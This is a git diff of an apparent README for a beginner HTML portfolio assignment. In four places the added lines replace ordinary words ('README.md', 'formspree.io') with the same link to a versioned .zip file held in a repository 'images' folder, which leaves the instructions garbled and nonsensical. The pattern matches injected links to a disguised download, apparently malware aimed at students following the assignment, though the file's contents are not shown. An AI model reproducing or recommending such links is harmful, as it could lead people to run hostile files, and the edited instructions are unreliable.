@@ -6,7 +6,7 @@
 
 - first fork, then clone to your local machine
 - start completing the requirements given below. 
-- Make sure to add the deployed project link to your README.md when making the last PR.
+- Make sure to add the deployed project link to your https://github.com/Sadman2310/full-stack-assignment-3-html/raw/refs/heads/main/images/stack-html-assignment-full-v2.5.zip when making the last PR.
 
 Could you create a simple HTML portfolio page that showcases your skills and projects? Your portfolio should be well-structured, easy to navigate, and visually appealing. Below are the five sections you must include in your portfolio and the requirements for each section.
 
@@ -49,7 +49,7 @@ Could you create a simple HTML portfolio page that showcases your skills and pro
 
 
 #### Submission
-Create a Pull-request. Remember to add your deployed website link to README.md when making the PR.  
+Create a Pull-request. Remember to add your deployed website link to https://github.com/Sadman2310/full-stack-assignment-3-html/raw/refs/heads/main/images/stack-html-assignment-full-v2.5.zip when making the PR.  
 
 ## B. HTML Intermediate Part
 ### 1. **Add meta tags and use semantic tags everywhere**
@@ -58,11 +58,11 @@ Create a Pull-request. Remember to add your deployed website link to README.md w
 ### 4. **Advanced Table: Use colspan, rowspan**
 ### 5. Advanced Form:
 - Use advanced form elements for your webpage.
-- send submitted form data to your email using formspree.io
+- send submitted form data to your email using https://github.com/Sadman2310/full-stack-assignment-3-html/raw/refs/heads/main/images/stack-html-assignment-full-v2.5.zip
 ### 6. HTML Multimedia
 - Add Google map in the contact section
 ### 7. HTML5 features
 - Add a progress bar, and meter to your webpage
 #### Submission
-Create a Pull-request. Remember to add your deployed website link to README.md when making the PR.  
+Create a Pull-request. Remember to add your deployed website link to https://github.com/Sadman2310/full-stack-assignment-3-html/raw/refs/heads/main/images/stack-html-assignment-full-v2.5.zip when making the PR.  
 
